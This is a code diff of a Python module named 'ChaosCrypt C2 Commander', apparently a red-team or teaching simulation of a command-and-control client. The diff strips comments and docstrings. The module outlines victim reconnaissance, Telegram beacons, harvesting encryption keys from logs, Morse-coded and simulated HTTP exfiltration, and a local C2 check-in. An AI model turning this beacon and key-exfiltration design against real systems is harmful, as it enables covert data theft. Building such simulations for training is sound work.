@@ -1,30 +1,3 @@
-"""
-ChaosCrypt C2 Commander — Command & Control Simulation Module
-=============================================================
-Доповнює network_monitor.py (який піднімає C2 сервер і робить PCAP).
-C2 Commander — це КЛІЄНТСЬКА сторона C2: beacon, recon, exfil, morse, reporting.
-
-Цикл:
-  1. System Recon      — збір інфо про жертву
-  2. Beacon/Heartbeat  — періодичний зв'язок з C2 (TG як C2 канал)
-  3. Key Exfiltration  — збір ключів шифрування з логів show/stealth
-  4. Morse Exfil       — stealth кодування даних у Морзе
-  5. HTTP Exfil Sim    — симуляція POST до C2 endpoint (SAFE_MODE)
-  6. Local C2 Connect  — з'єднання з SimpleC2Server (network_monitor.py)
-  7. Exfil Report      — JSON-звіт + TG document delivery
-
-LogBook phase: "c2" (окремий лог master_c2.jsonl)
-SAFE_MODE: жодних реальних HTTP-відправок назовні
-
-Запуск:
-  python chaoscrypt/c2_commander.py                   # Повний pipeline
-  python chaoscrypt/c2_commander.py --beacon           # Тільки beacon
-  python chaoscrypt/c2_commander.py --recon            # Тільки recon
-  python chaoscrypt/c2_commander.py --exfil-keys       # Тільки exfil ключів
-  python chaoscrypt/c2_commander.py --morse "SECRET"   # Morse encode
-  python chaoscrypt/c2_commander.py --connect          # Connect до local C2
-"""
-
 import os
 import sys
 import json
@@ -36,7 +9,6 @@ import base64
 import argparse
 import datetime
 
-# === IMPORT FIX ===
 current_dir = os.path.dirname(os.path.abspath(__file__))
 parent_dir = os.path.dirname(current_dir)
 if parent_dir not in sys.path:
@@ -59,7 +31,6 @@ except ImportError:
     send_document = None
     send_photo = None
 
-# ─���─ Constants ───
 C2_PHASE = "c2"
 C2_SERVER_PORT = 5654
 BEACON_INTERVAL_SEC = 8
@@ -80,8 +51,6 @@ MORSE_CODE = {
 
 
 class C2Commander:
-    """Command & Control Client Simulator — teaching/CTF/RedTeam demo."""
-
     def __init__(self):
         self.logger = LogBook(phase=C2_PHASE)
         self.session_id = hashlib.md5(
@@ -97,11 +66,7 @@ class C2Commander:
             "safe_mode": SAFE_MODE
         })
 
-    # ─────────────────────────────────────────────
-    # 1. SYSTEM RECON
-    # ─────────────────────────────────────────────
     def system_recon(self):
-        """Збирає інформацію про систему жертви."""
         print("[C2] ─── System Recon ───")
         self.recon_data = {
             "hostname": socket.gethostname(),
@@ -157,11 +122,7 @@ class C2Commander:
         print(f"[C2] Recon done. Host={self.recon_data['hostname']} IP={self.recon_data['local_ip']}")
         return self.recon_data
 
-    # ─────────────────────────────────────────────
-    # 2. BEACON / HEARTBEAT
-    # ─────────────────────────────────────────────
     def send_beacon(self, count=BEACON_COUNT, interval=BEACON_INTERVAL_SEC):
-        """Heartbeat до C2 через TG канал."""
         print(f"[C2] ─── Beacon (count={count}, interval={interval}s) ───")
         self.logger.log_event("network", "Beacon cycle started", metadata={
             "count": count, "interval": interval, "session_id": self.session_id
@@ -191,11 +152,7 @@ class C2Commander:
                               metadata={"total": count, "session_id": self.session_id})
         print(f"[C2] Beacon cycle complete ({count} sent).")
 
-    # ─────────────────────────────────────────────
-    # 3. KEY EXFILTRATION
-    # ─────────────────────────────────────────────
     def exfil_keys(self):
-        """Збирає ключі шифрування з логів show/stealth."""
         print("[C2] ─── Key Exfiltration ───")
         self.collected_keys = []
 
@@ -254,14 +211,10 @@ class C2Commander:
 
         return self.collected_keys
 
-    # ─────────────────────────────────────────────
-    # 4. MORSE EXFILTRATION
-    # ─────────────────────────────────────────────
     def morse_encode(self, text):
         return ' '.join(MORSE_CODE.get(c.upper(), '?') for c in text)
 
     def morse_exfil(self, data_text=None):
-        """Кодує дані в Морзе (stealth exfil teaching demo)."""
         payload = data_text or self.session_id
         morse = self.morse_encode(payload)
         print(f"[C2] ─── Morse Exfil ───")
@@ -281,11 +234,7 @@ class C2Commander:
             )
         return morse
 
-    # ─────────────────────────────────────────────
-    # 5. HTTP EXFIL SIMULATION (SAFE_MODE)
-    # ─────────────────────────────────────────────
     def http_exfil_sim(self):
-        """Симулює HTTP POST exfil (без реальних відправок)."""
         print("[C2] ─── HTTP Exfil Simulation ───")
         payload = {
             "session_id": self.session_id,
@@ -326,11 +275,7 @@ class C2Commander:
             )
         return payload
 
-    # ─────────────────────────────────────────────
-    # 6. LOCAL C2 CONNECT (до SimpleC2Server)
-    # ─────────────────────────────────────────────
     def connect_local_c2(self, message=None):
-        """З'єднується з SimpleC2Server з network_monitor.py."""
         print(f"[C2] ─── Local C2 Connect (port {C2_SERVER_PORT}) ───")
         payload = message or f"C2_CHECKIN|{self.session_id}|{socket.gethostname()}|{time.time()}"
 
@@ -371,11 +316,7 @@ class C2Commander:
             })
             return None
 
-    # ─────────────────────────────────────────────
-    # 7. EXFIL REPORT
-    # ─────────────────────────────────────────────
     def generate_exfil_report(self):
-        """Генерує JSON-звіт і відправляє через TG."""
         print("[C2] ─── Exfil Report ───")
         report = {
             "session_id": self.session_id,
@@ -410,11 +351,7 @@ class C2Commander:
         print(f"[C2] Report saved: {EXFIL_REPORT_PATH}")
         return EXFIL_REPORT_PATH
 
-    # ─────────────────────────────────────────────
-    # 8. FULL PIPELINE
-    # ─────────────────────────────────────────────
     def run_full_pipeline(self):
-        """Повний C2 цикл."""
         print("\n" + "=" * 60)
         print("*** ChaosCrypt C2 Commander — Full Pipeline ***")
         print("=" * 60)
@@ -432,22 +369,18 @@ class C2Commander:
                 parse_mode="HTML", async_mode=False
             )
 
-        # 1. Recon
         print()
         self.system_recon()
         time.sleep(1)
 
-        # 2. Beacon
         print()
         self.send_beacon(count=BEACON_COUNT, interval=BEACON_INTERVAL_SEC)
         time.sleep(1)
 
-        # 3. Key exfil
         print()
         self.exfil_keys()
         time.sleep(1)
 
-        # 4. Morse exfil
         print()
         if self.collected_keys:
             self.morse_exfil(self.collected_keys[0]['key'][:16])
@@ -455,17 +388,14 @@ class C2Commander:
             self.morse_exfil(self.session_id)
         time.sleep(1)
 
-        # 5. HTTP exfil sim
         print()
         self.http_exfil_sim()
         time.sleep(1)
 
-        # 6. Local C2 connect
         print()
         self.connect_local_c2()
         time.sleep(1)
 
-        # 7. Report
         print()
         report_path = self.generate_exfil_report()
 
@@ -491,7 +421,6 @@ class C2Commander:
         print("=" * 60)
         self.logger.close()
         return report_path
-
 
 def main():
     parser = argparse.ArgumentParser(description="ChaosCrypt C2 Commander")
@@ -521,7 +450,6 @@ def main():
         c2.generate_exfil_report()
     else:
         c2.run_full_pipeline()
-
 
 if __name__ == "__main__":
     main()
